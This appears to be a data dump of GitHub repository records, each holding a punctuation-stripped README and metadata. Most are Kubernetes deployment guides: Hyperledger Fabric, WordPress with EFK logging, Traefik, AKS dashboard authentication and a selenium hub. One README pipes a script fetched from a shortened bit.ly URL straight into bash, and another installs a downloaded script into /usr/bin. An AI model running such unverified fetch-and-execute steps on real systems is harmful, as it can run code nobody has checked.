peer0 ibm bash c peer lifecycle chaincode approveformyorg o orderer0 7050 tls cafile etc hyperledger orderers msp tlscacerts orderers ca 7054 pem collections config opt gopath src resources collections config json channelID mainchannel name resources version 1 0 sequence 1 package id tail n 1 pkg txt awk NF 1print NF docker exec it cli peer0 oracle bash c peer lifecycle chaincode approveformyorg o orderer0 7050 tls cafile etc hyperledger orderers msp tlscacerts orderers ca 7054 pem collections config opt gopath src resources collections config json channelID mainchannel name resources version 1 0 sequence 1 package id tail n 1 pkg txt awk NF 1print NF docker exec it cli peer0 ibm bash c peer lifecycle chaincode commit o orderer0 7050 tls cafile etc hyperledger orderers msp tlscacerts orderers ca 7054 pem collections config opt gopath src resources collections config json channelID mainchannel name resources version 1 0 sequence 1 sleep 5 docker exec it cli peer0 ibm bash c peer chaincode invoke C mainchannel n resources c Args Create CPUs 1 o orderer0 7050 tls cafile etc hyperledger orderers msp tlscacerts orderers ca 7054 pem docker exec it cli peer0 oracle bash c peer chaincode invoke C mainchannel n resources c Args Create Database Servers 1 o orderer0 7050 tls cafile etc hyperledger orderers msp tlscacerts orderers ca 7054 pem sleep 5 docker exec it cli peer0 ibm bash c peer chaincode query C mainchannel n resources c Args Index o orderer0 7050 tls cafile etc hyperledger orderers msp tlscacerts orderers ca 7054 pem docker exec it cli peer1 ibm bash c peer chaincode query C mainchannel n resources c Args Index o orderer0 7050 tls cafile etc hyperledger orderers msp tlscacerts orderers ca 7054 pem docker exec it cli peer0 oracle bash c peer chaincode query C mainchannel n resources c Args Index o orderer0 7050 tls cafile etc hyperledger orderers msp tlscacerts orderers ca 7054 pem docker exec it cli peer1 oracle bash c peer chaincode query C mainchannel n resources c Args Index o orderer0 7050 tls cafile etc hyperledger orderers msp tlscacerts orderers ca 7054 pem Okay now everything should be working as normal Lets test the apis and make sure they are connected properly bash cd node api node index js Start the GO api in a different terminal bash cd go api go run main go In a third terminal test the apis bash curl localhost 3000 v1 resources curl localhost 4001 resources You should see this bash k8s hyperledger fabric 2 2 master curl localhost 3000 v1 resources id 1 name CPUs resourcetypeid 1 active true id 2 name Database Servers resourcetypeid 1 active true k8s hyperledger fabric 2 2 master curl localhost 4001 resources id 1 name CPUs resourcetypeid 1 active true id 2 name Database Servers resourcetypeid 1 active true k8s hyperledger fabric 2 2 master Lets run the front end and test it bash cd frontend npm run serve Everything should work Kubernetes Minikube Local Install Kubernetes and Minikube https kubernetes io docs tasks tools If OSX here is virtual box https www virtualbox org wiki Mac 20OS 20X 20build 20instructions Kubernetes book hhttps www amazon com Devops 2 3 Toolkit Viktor Farcic dp 1789135508 ref tmmpapswatch0 encoding UTF8 sr 8 2 K8s Persistent Volumes https kubernetes io docs concepts storage persistent volumes Okay now that we ve successfully ran the network locally let s do this on a local kubernetes installation bash minikube start sleep 5 kubectl apply f network minikube storage pvc yaml sleep 5 kubectl apply f network minikube storage tests Now we have storage and we re going to test it You can do a kubectl get pods to see what pods are up Here s how I can connect to my containers You should split your terminal and connect to both bash k8s hyperledger fabric 2 2 master kubectl get pods NAME READY STATUS RESTARTS AGE example1 6858b4f776 5pgls 1 1 Running 0 17s example1 6858b4f776 q92vv 1 1 Running 0 17s example2 55fcbb9cbd drzwn 1 1 Running 0 17s example2 55fcbb9cbd sv4c8 1 1 Running 0 17s k8s hyperledger fabric 2 2 master We ll use one of these to setup the files for the network bash kubectl exec it kubectl get pods o name grep example1 sed s 4 mkdir p host files scripts kubectl exec it kubectl get pods o name grep example1 sed s 4 mkdir p host files chaincode kubectl cp scripts kubectl get pods o name grep example1 sed s 4 host files kubectl cp network production configtx yaml kubectl get pods o name grep example1 sed s 4 host files kubectl cp network production config yaml kubectl get pods o name grep example1 sed s 4 host files kubectl cp chaincode resources kubectl get pods o name grep example1 sed s 4 host files chaincode kubectl cp chaincode resourcetypes kubectl get pods o name grep example1 sed s 4 host files chaincode kubectl cp fabric samples bin kubectl get pods o name grep example1 sed s 4 host files Let s bash into the container and make sure everything copied over properly bash kubectl exec it kubectl get pods o name grep example1 sed s 4 bash Finally ready to start the ca containers bash kubectl apply f network minikube cas Your containers should be up and running You can check the logs like so and it should look liek this bash k8s hyperledger fabric 2 2 master kubectl logs f orderers ca d69cbc664 dzk4f 2020 12 11 04 12 37 INFO Created default configuration file at etc hyperledger fabric ca server fabric ca server config yaml 2020 12 11 04 12 37 INFO Starting server in home directory etc hyperledger fabric ca server 2020 12 11 04 12 38 INFO generating key A ecdsa S 256 2020 12 11 04 12 38 INFO encoded CSR 2020 12 11 04 12 38 INFO signed certificate with serial number 307836600921505839273746385963411812465330101584 2020 12 11 04 12 38 INFO Listening on https 0 0 0 0 7054 This should generate the crypto config files necessary for the network You can check on those files in any of the containers bash root example1 6858b4f776 wmlth host cd files root example1 6858b4f776 wmlth host files ls bin chaincode config yaml configtx yaml crypto config scripts root example1 6858b4f776 wmlth host files cd crypto config root example1 6858b4f776 wmlth host files crypto config ls ordererOrganizations peerOrganizations root example1 6858b4f776 wmlth host files crypto config cd peerOrganizations root example1 6858b4f776 wmlth host files crypto config peerOrganizations ls ibm oracle root example1 6858b4f776 wmlth host files crypto config peerOrganizations cd ibm root example1 6858b4f776 wmlth host files crypto config peerOrganizations ibm ls msp peers users root example1 6858b4f776 wmlth host files crypto config peerOrganizations ibm cd msp root example1 6858b4f776 wmlth host files crypto config peerOrganizations ibm msp ls IssuerPublicKey IssuerRevocationPublicKey admincerts cacerts keystore signcerts tlscacerts user root example1 6858b4f776 wmlth host files crypto config peerOrganizations ibm msp cd tlscacerts Time,2020-12-10T04:48:14Z,2020-12-27T07:15:29Z,Go,User,1,1,0,11,master,happilymarrieddad,1,0,0,0,0,0,2
feliperfmarques,k8s-wordpress-efk-example,,Wordpress MySQL EFK ElasticSearch Fluentd Kibana This repository contains example code for Deploy Wordpress MySQL EFK ElasticSearch Fluentd Kibana Example for tests in ssllabs https site wordpress tk https site wordpress tk Wordpress MySQL ElasticSearch Using Elastic Cloud on Kubernetes ECK Fluentd Fluentbit Using Helm chart Banzaicloud logging operator logging Logging Flow Using Helm Chart Banzaicloud logging operator Deploy instructions 1 Create Namespaces kubectl create ns site wordpress kubectl create ns cert manager kubectl create ns ingress nginx kubectl create ns elastic system kubectl create ns observability 2 Deploy Helm Charts Banzaicloud logging operator and logging operator logging helm repo add banzaicloud stable https kubernetes charts banzaicloud com helm repo update helm install logging operator banzaicloud stable logging operator n observability set createCustomResource false set rbac enable true Cert Manager for TLS Certificates helm repo add jetstack https charts jetstack io helm repo update helm install cert manager jetstack cert manager n cert manager namespace cert manager version v0 16 1 set installCRDs true Ingress Nginx helm repo add ingress nginx https kubernetes github io ingress nginx helm repo update helm install ingress nginx ingress nginx ingress nginx n ingress nginx 3 Create Secrets for Wordpress MySQL and ElasticSearch Wordpress and MySQL secrets For testing purposes a password will be stored in Kubernetes Secrets but for production grade deploy consider to use some secret manager solution cat secrets txt wordpressdatabaserootpassword teste wordpressdatabasepassword teste wordpresspassword teste EOF kubectl create secret generic site wordpress secrets n site wordpress from env file secrets txt Elasticsearch secrets Actually with ECK isn t possible to set the password by CRDs But thre is a workarround https github com elastic cloud on k8s issues 967 issuecomment 497636249 creating the clusterName es elastic user Secret before creating the Elasticsearch resource For testing purposes a password will be configured in this way but for production grade deploy consider to use some secret manager solution kubectl create secret generic logging es elastic user from literal elastic teste n observability 4 Deploy ECK Operator For ElasticSearch Kibana kubectl apply f https download elastic co downloads eck 1 2 1 all in one yaml 5 Deploy MySQL kubectl apply f manifests mysql mysql pvc yaml n site wordpress kubectl apply f manifests mysql mysql svc yaml n site wordpress kubectl apply f manifests mysql mysql sts yaml n site wordpress 6 Setup Cert Manager and create Certificate For testing purposes Certificate and DNS provider secrets will be stored in this Kubernetes Secret but for production grade deploy consider to use some secret manager solution kubectl apply f manifests cert manager issuer yaml n site wordpress kubectl apply f manifests cert manager certificate yaml n site wordpress 7 Deploy Wordpress kubectl apply f manifests wordpress wordpress pvc yaml n site wordpress kubectl apply f manifests wordpress wordpress svc yaml n site wordpress kubectl apply f manifests wordpress wordpress sts yaml n site wordpress kubectl apply f manifests wordpress wordpress ingress yaml n site wordpress 8 Setup ElasticSearch Cluster and Kibana using ECK CRDs kubectl apply f manifests efk es cluster yaml n observability kubectl apply f manifests efk kibana eck yaml n observability 9 Setup Logging Flow using Banzaicloud logging operator CRDs kubectl apply f manifests efk logging operator logging yaml n observability kubectl apply f manifests efk logging operator cluster output yaml n observability kubectl apply f manifests efk logging operator flow yaml n site wordpress PS For testing purposes a script for create cluster in GKE has been added in manifests cluster example,2020-08-28T04:22:51Z,2020-09-03T03:08:03Z,Shell,User,1,1,0,24,master,feliperfmarques,1,0,0,0,0,0,0
StaticVish,vagrant-kvm-k8s-setup,,vagrant kvm k8s setup This is a Work in Progress Repository The idea is to spin a Kubernetes Cluster with libvirt and vagrant This is tested on Debian 10 System Prerequisites 1 libvirt KVM 2 vagrant Known Issues The Master has to spin up first and then the minions The KVM is quite fast in spinning the nodes hence the Minions will not start unless the master is running As a workaround the startup is a two step process vagrant up k8s master 1 Once the Master is started issue the following command to bootstrap the minions vagrant up k8s minion 1 k8s minion 2 k8s minion 3 1 Installing KVM Vagrant sudo apt install qemu kvm libvirt clients libvirt daemon system bridge utils libguestfs tools genisoimage virtinst libosinfo bin vagrant vagrant libvirt vagrant mutate vagrant sshfs python3 vagrant 2 Allow normal user to manage virtual machine sudo adduser whoami libvirt sudo adduser whoami libvirt qemu 3 Read more on How to install on Debian here https wiki debian org KVM,2020-10-04T07:06:36Z,2020-10-04T08:24:36Z,Shell,User,1,1,1,6,main,StaticVish,1,0,0,0,0,0,0
ngoduykhanh,k8s-traefik-v2,,k8s traefik v2 Traefik v2 deployment to kubernetes Notes Copy from my original blog post https blog ndk name kubernetes and traefik v2 Put everything in the same folder then we can deploy easily with a single command shell kubectl apply f However before you apply take notes I use default namespace change it if you want I use DaemonSet instead of Deployment change it if you want I use entrypoints web http redirections entryPoint to websecure to force a redirection from http to https globally without middleware configs Remove it if you don t want I use tls ndk name as my TLS secret Please change it The dashboard is secured with a basic authentication You can generate a base64 encoded of htpasswd with command htpasswd nb user password openssl base64 I don t use Ingress I use IngressRoute Yes it is a new kind in Traefik v2,2020-10-06T21:40:05Z,2020-12-14T10:33:28Z,n/a,User,1,1,0,4,master,ngoduykhanh,1,0,0,0,1,0,0
electrocucaracha,k8s-HorizontalPodAutoscaler-demo,,Kubernetes Horizontal Pod Autoscaler Build Status https api travis ci com electrocucaracha k8s HorizontalPodAutoscaler demo svg https travis ci com github electrocucaracha k8s HorizontalPodAutoscaler demo License https img shields io badge License Apache 202 0 blue svg https opensource org licenses Apache 2 0 Summary This project was created to demonstrate what components are required by an application to consume Kubernetes Horizontal Pod Autoscaler 1 feature The k6 yml tests k6 yml provides a traffic simulator which generates virtual users those users perform HTTP requests against the web server The Prometheus instance collects custom metrics which are aggreated by Prometheus Adapter and consumed by Horizontal Pod Autoscaler this last component triggers actions to scale out in replicas in order to distribute the workload Dashboard img diagram png Virtual Machines The Vagrant tool 2 can be used for provisioning an Ubuntu Focal Virtual Machine It s highly recommended to use the setup sh script of the bootstrap vagrant project 3 for installing Vagrant dependencies and plugins required for this project That script supports two Virtualization providers Libvirt and VirtualBox which are determine by the PROVIDER environment variable curl fsSL http bit ly initVagrant PROVIDER libvirt bash Once Vagrant is installed it s possible to provision a Virtual Machine using the following instructions vagrant up The provisioning process will take some time to install all dependencies required by this project and perform a Kubernetes deployment on it 1 https kubernetes io docs tasks run application horizontal pod autoscale 2 https www vagrantup com 3 https github com electrocucaracha bootstrap vagrant,2020-11-06T22:46:05Z,2020-12-16T00:59:43Z,Shell,User,1,1,0,15,master,electrocucaracha,1,0,0,0,0,0,0
steveoni,tensorflow-serving-docker-k8s,,tensorflow serving docker k8s This repo contains the code for the articl Kubernetes vs Docker What You Should Know as a Machine Learning Engineer https neptune ai blog kubernetes vs docker for machine learning engineer The article gives a simple practical guide on how Data scientist and Machine learning Engineer can get started with kubernetes alongside with docker Here is the final architecture used kubernets architecture https i1 wp com neptune ai wp content uploads tf kube png resize 1024 2C614 ssl 1,2020-10-10T02:38:15Z,2020-12-23T07:18:33Z,HTML,User,1,1,0,5,main,steveoni,1,0,0,0,0,0,0
danilobondezan,ansible-role-install-k8s,,ansible role install k8s only tested in ubuntu Ansible Role for install K8s one master and two workers pip install r requirements txt ansible playbook k8s yml adjust the hosts file as you need with the IPs of the nodes or your dynamic inventory from AWS for example tagk8smaster or tagk8sworker If you want to manage the machines with no user and pass run the playbook k8s uers yml with the options k K for the first time to add you pubkey put the pubkey in the roles users files with the suffix pub,2020-09-01T17:12:09Z,2020-10-17T17:38:43Z,Shell,User,1,1,0,6,master,danilobondezan,1,0,0,0,0,0,0
guo40020,k8s-Install-AllYouNeed,k8s#k8s-install#kubernetes,k8s Install AllYouNeed k8s Deb1 19 0x00 CLONE THIS REPO clone git clone https github com guo40020 k8s Install AllYouNeed swap sudo swapoff a docker sudo apt install docker docker io containerd Ubuntu 19 04 Debian 10 iptableslegacy bash update alternatives set iptables usr sbin iptables legacy update alternatives set ip6tables usr sbin ip6tables legacy update alternatives set arptables usr sbin arptables legacy update alternatives set ebtables usr sbin ebtables legacy 0x01 TUNA which is https mirrors tuna tsinghua edu cn 1 apt key cd k8s Install AllYouNeed sudo apt key add k8s key gpg 2 k8s bash cat EOF sudo tee etc apt sources list d kubernetes list deb https mirrors tuna tsinghua edu cn kubernetes apt kubernetes xenial main EOF 3 kubeadm kubelet kubectl apt sudo apt update sudo apt install y kubeadm kubelet kubectl apt sudo apt hold kubeadm kubelet kubectl 0x02 k8s k8s google containers k8s gcr io k8s gcr io kubeadm config images list google containers 01 docker docker service lib systemd system docker service nano vim sudo Service bash Environment HTTPPROXY http Environment HTTPSPROXY http Environment NOPROXY 127 0 0 1 localhost sudo kubeadm config images pull 02 docker save dockertar sftp scp docker load input docker fake k8s gcr io hosts k8s gcr io 0x03 kubeadm init k8s CNI Calico https www projectcalico org master sudo kubeadm init pod network cidr 192 168 0 0 16 pod network cidr kubeadm bash mkdir p HOME kube sudo cp i etc kubernetes admin conf HOME kube config sudo chown id u id g HOME kube config Calico bash kubectl create f https docs projectcalico org manifests tigera operator yaml kubectl create f https docs projectcalico org manifests custom resources yaml k8spod bash watch kubectl get pods A podRunningpod kubectl taint nodes all node role kubernetes io master END k8s ENJOY LEARNING,2020-11-01T05:27:15Z,2020-11-01T12:54:15Z,n/a,User,1,1,0,3,main,guo40020,1,0,0,0,0,0,0
wubrg,iac-tech-talk-k8s,,IAC Tech Talk K8s Deploying and Maintaining Code for Kubernetes This repository is an example repo for common tooling to manage the source code for your Kubernetes clusters In this repo you will find folders for helm terraform and kustomize You will also see a docker folder that houses a nginx image used in all of the examples Each folder has the bare minimum of code to demonstrate what your actual source code would look like if you were to use the given tool to build and manage your services etc on your k8s cluster This document will discuss the various strengths and weaknesses and some things to think about when using each tool to manage your k8s source code This document is meant to serve as a quick reference point for getting acquainted with a tool and understanding when and why you should use it Tools Kustomize https kustomize io Terraform K8s Provider https registry terraform io providers hashicorp kubernetes latest docs guides getting started Helm https helm sh docs KotS https github com replicatedhq kots TODO K8sLens https k8slens dev TODO Harness https harness io kubernetes TODO Kustomize Kustomize is a tool that allows you to apply customizations to yaml files and output valid k8s yaml It is a command line tool that is native to kubernetes Strengths Kustomize excels at providing powerful and simple layering of configuration to a set of base yaml configurations It works with any yaml not just k8s resources Version control everything in your kustomization yaml file can be version controlled Its not helm Weaknesses Kustomize can take a while to get used to and can be especially hard to debug some error messages thanksYAML Requires a hand rolled solution for state and secret management At the end of the day you re combining yaml and sometimes you simply can t mash two things together without some really smart code and kustomize is not that code Other Considerations Always reference tagged bases and overlays in your kustomization yaml This will avoid unexpected errors when making changes and promoting them to an environment Treat the output of kustomize as a deployment artifact Avoid using environment variables to provide information from the pipeline instead the pipeline should build the dev artifact with dev values seeded from a dev patch yaml that is version controlled This will make pipelining much simpler Kustomize is a fantastic tool to use when you are working with simple or complex k8s resources as long as those do not require heavy conditional logic It wants to be used is a highly modular fashion but you need to be careful Avoid using highly variable overlays and bases Instead prefer stochastic modules that are focused and narrow Kustomize is not a tool to manage the actual state of your k8s infrastructure It relies on kubectl or manual intervention to remove resources from the cluster that are no longer required Version your kustomize cli tool to avoid weirdness when collaborating with others Terraform Kubernetes Provider HashiCorp has their own K8s provider that you can use to define your k8s infrastructure the same as you would any other infrastructure Strengths Integration with Terraform The best state management out of the box Write declarative K8s code with an actual language instead of a bunch of yaml You can test that code Excellent secret management integration Weaknesses That declarative language is HCL Provider versions can lag behind official releases from K8s and you are reliant on HashiCorp to update Other Considerations TBD Helm Charts Helm is a package manager for Kubernetes Helm installs charts packages into Kubernetes creating a new release version for each installation And to find new charts you can search Helm chart repositories Strengths Community OSS packages for common software allows you to hit the ground running for standard solutions Helm is a package manager and allows you to verify the integrity of your charts and allows you to sign them yourself State management out of the box via helm cli tool Supports conditional logic in charts via templating languange Helm RBAC is equivalent to K8s RBAC Weaknesses Helm templates are cluttered and hard to parse making contributing or writing your own charts cumbersome And that s not even considering nested templates Helm manages state but it is incomplete and often requires creative solutions to keep related dependencies updated when the underlying state files do not change themselves Other Considerations Community packages eventually will diverge from your use case and you ll be forced to fork or contribute back KotS from Replicated Kubernetes off the Shelf Uses the kotsadmin cli to manage releases and deploy and monitor them This sits on a level higher than Helm or Kustomize and focus more on the operations of your K8s infrastructure rather than your development Strengths GitOps integration baked in release and state management removes need to run kubectl apply locally instead you get a nice ui thing to managed the already changed code on a branch in master built in monitoring logging support built on top of kustomize same patterns for good kustomize code would apply to new releases for kots works with helm as well provides cluster pre flight checks all open source Weaknesses Must be KotS application compatible requires paid account with Replicated another abstraction layer to learn unique to itself K8sLens K8sLens is an integrated K8s IDE It hooks into your clusters and provides real time visibility to monitoring and logs of your cluster resources It provides shell hooks for pods and allows you to do real time editing of resources It looks very promising as a development tool that warrants further testing Strengths very slick and integrated with k8s clusters you have access to makes the annoying work for debugging verifying a deployed k8s manifest very simple Weaknesses all changes are real time to the configured cluster and thus are manually applied by the local workstation very new most documentation is lacking not concerned with code management as much as high visibility and interoperability with existing configured clusters,2020-11-30T20:39:49Z,2020-12-01T20:09:32Z,HCL,User,1,1,0,5,master,wubrg,1,0,0,0,0,0,0
jbdoumenjou,k8s-api-gateway-sandbox,,Goal A simple sandbox to test the kubernetes gateway provider on Traefik Usage Prerequisite Having k3d installed shell script k3d cluster create mycluster api port 6550 p 80 80 loadbalancer p 8080 8080 loadbalancer p 443 443 loadbalancer k3s server arg no deploy traefik i rancher k3s v1 18 6 k3s1 k3d image import traefik traefik latest c mycluster kubectl get o json gateways my gateway httproute bad port jq status,2020-11-10T15:30:14Z,2020-12-07T15:55:10Z,Shell,User,2,1,0,2,master,jbdoumenjou,1,0,0,0,0,0,0
j3ffk3,deploy-hyperledger-fabric-on-k8s,,hyperledger fabric 2 2 kubernetes https hackmd io aI6VgpUKRtOQKAnR 5U3TQ view,2020-12-01T04:57:25Z,2020-12-07T13:09:34Z,n/a,User,1,1,0,7,master,j3ffk3,1,0,0,0,0,0,0
ticapix,ovh-demo-k8s-batch-processing,,Batch Processing with OVHcloud Managed Kubernetes The main goal of this demo is to show how to use OVHcloud Managed Kubernetes to do batch processing or grid computing with a minimal setup The tools used will be OVHcloud Managed Kubernetes with nodepool OVHcloud Object Storage For the demo we ll use a custom docker image based on ffmpeg to generate webm video thumbnails Node autoscaling To do batch processing on our cluster we ll configure 2 nodepools a system nodepool for our admin and monitoring Pods a compute nodepool for our computing nodes Both nodepools can be initialized with this configuration yaml apiVersion kube cloud ovh com v1alpha1 kind NodePool metadata name system spec desiredNodes 1 flavor b2 7 maxNodes 3 minNodes 1 apiVersion kube cloud ovh com v1alpha1 kind NodePool metadata name compute spec desiredNodes 0 flavor c2 15 maxNodes 100 minNodes 0 and Job are declared with nodeSelector property and 2 labels matching the nodepool name defined above yaml apiVersion batch v1 kind Job metadata name generate thumb job timestamp labels nodepool compute needed to filter Job associated to the nodepool spec template metadata labels nodepool compute needed to filter Pod associated to the nodepool spec template spec containers nodeSelector nodepool compute needed to schedule Pod on the correct nodepool Why not using Taint Toleration Because in a controlled environment ie with a dedicated cluster single tenant few system services there is no need Adding a taint would require doable but means more code to watch for new nodes in the nodepool and add the taint on the fly before anything can be scheduled on it Autoscaling monitoring We ll deploy a nodepool monitoring deployment which has the following state machine autoscaling autoscaling statemachine svg Useful info for the client calls https docs rs k8s openapi 0 9 0 k8sopenapi api core v1 for the api calls use the v 6 8 on kubectl for the api calls use kubectl get raw apis jq,2020-09-03T10:56:24Z,2020-11-19T05:05:12Z,Python,User,1,1,0,2,master,ticapix,1,0,0,0,0,0,0
shpwrck,k8s-sec-cam-poc,,k8s sec cam poc Goal Create a security camera kubernetes cluster with raspberry pi zero w nodes and a raspberry pi X control plane Hardware Components 1 Camera Nodes Pi Zero W Pi Zero Case micro SD Card Pi Zero Camera Module Power Supply 1 Control Plane Node Whatever Pi 3 I have lying around ease of deployment for kubeadm Power Supply Case Software Components Kubernetes start with kubeadm MotionEye in container References inspiration https youtu be JNVFfqtHj3k kubeadm on pi zero w https github com kubernetes kubeadm issues 253 issuecomment 633399999 motioneye https github com ccrisan motioneye wiki Install In Docker,2020-09-24T14:39:29Z,2020-09-25T02:20:50Z,n/a,User,1,1,0,5,master,shpwrck,1,0,0,0,0,0,0
hisham-maged10,simple-server-client-k8s-deployment,,A very simple repository that showcases using docker compose for dev and prod multi stage builds use of bind volumes for source code in dev env for using docker for development and deploying app to kubernetes cluster in pod replicas connecting them via a Loadbalancer and a nodeport services,2020-11-11T02:42:34Z,2020-12-03T03:04:30Z,JavaScript,User,1,1,0,7,main,hisham-maged10,1,0,0,0,0,0,0
weinong,k8s-dashboard-with-aks-aad,aad#aks#azure#k8s#kubernetes,A guide to enable oauth2 proxy to access Kubernetes dashboard on AKS managed AAD cluster Background Kubernetes dashboard supports Authorization header https github com kubernetes dashboard blob master docs user access control README md authorization header so that you can access the dashboard as the end user On Azure Kubernetes Service AKS clusters with AAD enabled you need oauth2 proxy https github com oauth2 proxy oauth2 proxy to login the AAD user and send the bearer token to the dashboard Since AKS introduced managed AAD https docs microsoft com en us azure aks managed aad you no longer need to bring your own AAD applications While this is great that you don t need to manage the AAD applications and the credential it brings confusion on what you need to do to setup oauth2 proxy and the ingress NOTE AKS retires the Kubernetes dashboard from v1 18 and onwards This guide assumes you are using the upstream Kubernetes dashboard Setup In managed AAD a pair of cross tenant AAD applications are provided This can be seen in the kubeconfig What this means is kubectl uses a public client 80faf920 1908 4b52 b5ef a8e7bedfc67a to log you in to AAD to access an AAD resource 6dae42f8 4368 4678 94ff 3960e28e3630 Once you complete the device code login kubectl sends the access token which is issued to access 6dae42f8 4368 4678 94ff 3960e28e3630 to api server This is akin to how you use azure cli to access Azure That too uses a public client application to request access token to Azure https management azure com yaml auth provider config apiserver id 6dae42f8 4368 4678 94ff 3960e28e3630 client id 80faf920 1908 4b52 b5ef a8e7bedfc67a config mode 1 environment AzurePublicCloud tenant id name azure To translate this into oauth2 proxy configuration you need to create a AAD Web application to be used by the oauth2 proxy so that the token flow looks like user logins to oauth2 proxy web app to request access to AKS AAD Server App and forward the access token to Kubernetes dashboard Creating the web application In AAD App Registration create an application with redirect url like https oauth2 callback create a client secret under Certificate secrets In API Permissions Add a permission APIs my organization uses put in 6dae42f8 4368 4678 94ff 3960e28e3630 and select Delegated Permissions and user read api permission attachments api permission png Note It is the same application ID 6dae42f8 4368 4678 94ff 3960e28e3630 in all clouds Configure oauth2 proxy You will need to use azure provider and specify resource 6dae42f8 4368 4678 94ff 3960e28e3630 This allows the oauth2 proxy which uses the web app we just created to request access to AKS AAD Server App However due to 779 https github com oauth2 proxy oauth2 proxy issues 779 and 913 https github com oauth2 proxy oauth2 proxy issues 913 azure provider in oauth2 proxy is broken when resource is used While we are waiting for 914 https github com oauth2 proxy oauth2 proxy pull 914 to be merged you can use my pre built docker image docker io weinong oauth2 proxy v6 1 1 109 g49746b8 which has the fix A sample deployment yaml is provided oauth2 proxy yaml oauth2 proxy yaml Here is the snippet yaml spec containers args provider azure email domain http address 0 0 0 0 4180 azure tenant client id client secret cookie secret refer to https oauth2 proxy github io oauth2 proxy docs configuration overview pass access token true resource 6dae42f8 4368 4678 94ff 3960e28e3630 set xauthrequest true image docker io weinong oauth2 proxy v6 1 1 109 g49746b8 imagePullPolicy Always name oauth2 proxy The important flags are provider azure you have to use azure provider azure tenant your AAD tenant ID client id the web app application ID client secret the web app secret resource requests access token for this resource It has to be 6dae42f8 4368 4678 94ff 3960e28e3630 pass access token passes access token to upstream via X Forwarded Access Token header set xauthrequest along with pass access token this adds access token to X Auth Request Access Token header to the response Note This is not a complete guide to setup oauth2 proxy Always refer to https oauth2 proxy github io oauth2 proxy docs configuration overview for complete configuration Configure Ingress ingress yaml ingress yaml is provided assuming you are using Nginx ingress controller This setups the dashboard ingress to use oauth2 proxy as external authentication It also populates the bearer token using access token from X Auth Request Access Token from oauth2 proxy response header Note Ingress TLS is omitted in this guide you need to create your own ingress certificate Troubleshooting If this doesn t work look at oauth2 proxy pod log to see if you are authenticated or not go to https oauth2 with network trace open in your browser Verify you see the response header X Auth Request Access Token,2020-11-19T18:56:42Z,2020-12-17T00:21:22Z,n/a,User,1,1,0,4,main,weinong,1,0,0,0,0,0,0
mourad-hamza,nutanix-karbon-k8s-login,cluster#karbon#kubernetes#nutanix#nutanix-karbon-kubernetes#prism,Nutanix Karbon Kubernetes login command line This project is a command line to automate login to Nutanix Karbon Kubernetes based cluster Resouces This command line is based on Prism central Karbon API https www nutanix dev reference karbon api reference cluster getk8sclusterkubeconfig that help to download the Kubernetes config file from a given cluster Requirements Have already created users with at least view permission on Prism Central users can be local or from LDAP Have installed curl command console RHEL CENTOS yum install y curl Debian Ubuntu apt get install y curl How to install console curl o usr bin karbon login https raw githubusercontent com mourad hamza nutanix karbon k8s login main karbon login chmod x usr bin karbon login Usage console Usage karbon login k KARBONAPIURL c KUBERNETESCLUSTERNAME i INSECURE u USERNAME p PASSWORD karbon login h This command is to automate login to Nutanix Karbon Kubernetes based cluster it simply gets the config file from Nutanix Prism central Karbon server for a given Kubernetes cluster and stores it in the user home directory kube config Options k or karbon api url Karbon API URL like https IPADDRESS 9440 or https FQDN 9440 c or k8s cluster Kubernetes cluster name in Karbon clusters list i or insecure Disable SSL certificat check for Prism central URL u or username Prism central username p or password Prism central password h or help Display this help Notes This command line can be used in an interactive or non interactive mode this will depend on the login and password given in the arguments,2020-10-30T12:18:22Z,2020-12-24T20:09:52Z,Shell,User,2,1,0,10,main,mourad-hamza,1,1,1,1,0,0,0
adavarski,PaaS-and-SaaS-POC,,PaaS SaaS data driven data analyst data engineer data scientist platform playground R D MVP POC environmints Summary Vagrant Docker k8s AWS IaC based PaaS SaaS infrastucture environments POC Terraform for AWS infrastructure provisioning Vagrant Docker k8s for Dev environments and Ansible for Configuration Management CM Used stacks and products for PaaS SaaS POC VPN WireGuard k8s Kilo Monitoring stacks Prometheus based TIG Telegraf InfluxDB Grafana Sensu Zabbix Indexing and Analytics Debugging and Log management stacks ELK EFK Pipeline Messaging Kafka stack Kafka cluster Zookeper cluster Kafka Replicator Kafka Connect Schema Registry Routing and Transformation Serverless OpenFaaS ETL Apache NiFi Data Lake Big Data MinIO s3 compatable Object Storage DWHs HIVE with MinIO s3 Cassandra Presto Blockchein Ethereum for Smart Contacts Apache Spark for large scale data processing and data analytics Machine Learning Deep Learning AutoML TensorFlow k8s Model Development with AutoML Kubeflow MLflow etc and k8s AI Model Deployment Seldon Core Spark ML with S3 MinIO as Data Source GitLab Jenkins In Platform CI CD including GitOps Identity and Access Management IAM Keycloak JupyterHub JupyterLab for data science Consul cluster HashiCorp Vault cluster Postgres cluster with Patroni k8s Persistent Volumes Rook Ceph Gluster etc PaaS SaaS POC Development environments used docker compose based dev env Vagrant based dev env Vagrant IaC for simulating public private cloud envs AWS Azure GCP OCP OpenStack etc Very flexible ruby syntax better than OpenStack KVM for DEV you can use Vagrant with VBOX KVM etc Packer create Vagrant boxes for Vbox KVM etc like AWS AMIs creation with Packer Ansible for Configuration Management k8s k8s local k3s minikube kubespray Note Default development environment AWS Terraform for provisioning infrastructure Ansible for Configuration Management CM KOPS for k8s clusters deploy on AWS and k8s Operators Helm Charts YAML manifests for creating k8s deployments PasS SaaS services PaaS SaaS objectives Platform as a Service PaaS will be data driven and data science platform allowing end user to develop run and manage applications without the complexity of building and maintaining the infrastructure Software as a Service SaaS will be on demand software accessed used by end users using a web browser,2020-10-25T09:24:23Z,2020-12-29T09:53:06Z,Jupyter Notebook,User,1,1,0,324,main,adavarski,1,0,0,0,0,0,13
alcounit,selenosis,automated-testing#automation#docker#k8s#kubernetes#selenium#selenium-grid#selenium-server#selenium-webdriver#webdriver,Docker Pulls https img shields io docker pulls alcounit selenosis https hub docker com r alcounit selenosis tags page 1 ordering lastupdated selenosis Scalable stateless selenium hub for Kubernetes cluster Overview Available flags user host selenosis help Scallable stateless selenium grid for Kubernetes cluster Usage selenosis flags Flags port string port for selenosis default 4444 proxy port string proxy continer port default 4445 browsers config string browsers config default config browsers yaml browser limit int active sessions max limit default 10 namespace string kubernetes namespace default selenosis service name string kubernetes service name for browsers default seleniferous browser wait timeout duration time in seconds that a browser will be ready default 30s session wait timeout duration time in seconds that a session will be ready default 1m0s session iddle timeout duration time in seconds that a session will iddle default 5m0s session retry count int session retry count default 3 graceful shutdown timeout duration time in seconds gracefull shutdown timeout default 30s image pull secret name string secret name to private registry proxy image string in case you use private registry replace with image from private registry default alcounit seleniferous latest h help help for selenosis Available endpoints Protocol Endpoint HTTP wd hub session HTTP wd hub 